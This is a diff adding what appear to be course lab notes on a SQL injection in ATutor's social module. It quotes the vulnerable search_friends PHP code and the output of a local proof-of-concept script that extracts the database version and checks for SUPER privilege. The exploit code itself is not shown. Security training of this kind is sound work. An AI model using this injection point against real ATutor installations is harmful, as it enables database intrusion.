@@ -1,0 +1,35 @@
+In /opt/lampp/htdocs/ATutor/mods/_standard/social/index_public.php:
+
+if((isset($rand_key) && $rand_key!='' && isset($_POST['search_friends_'.$rand_key])) || isset($_GET['search_friends'])){
+        if (empty($_POST['search_friends_'.$rand_key]) && !isset($_GET['search_friends'])){
+                $msg->addError('CANNOT_BE_EMPTY');
+                header('Location: '.url_rewrite(AT_SOCIAL_BASENAME.'index_public.php', AT_PRETTY_URL_IS_HEADER));
+                exit;
+        }
+        //to adapt paginator GET queries
+        if(isset($_GET['search_friends'])){
+                $search_field = $addslashes($_GET['search_friends']);
+        } else {
+                $search_field = $addslashes($_POST['search_friends_'.$rand_key]);
+        }
+        if (isset($_POST['myFriendsOnly'])){
+                //retrieve a list of my friends
+                $friends = searchFriends($search_field, true);
+        } else {
+                //retrieve a list of friends by the search
+                $friends = searchFriends($search_field);        //to calculate the total number. TODO: need a better way, wasting runtime.
+                $num_pages = max(ceil(sizeof($friends) / SOCIAL_FRIEND_SEARCH_MAX), 1);
+                $friends = searchFriends($search_field, false, $offset);
+        }
+}
+
+
+
+$ python3 /home/rockylinux/Documents/AWAE/3.6/poc4.py localhost
+(+) Retrieving database version length....
+10
+(+) Retrieving database version....
+5.6.20-log
+(+) Checking if the database user has SUPER privilege...
+Yes
+(+) done!
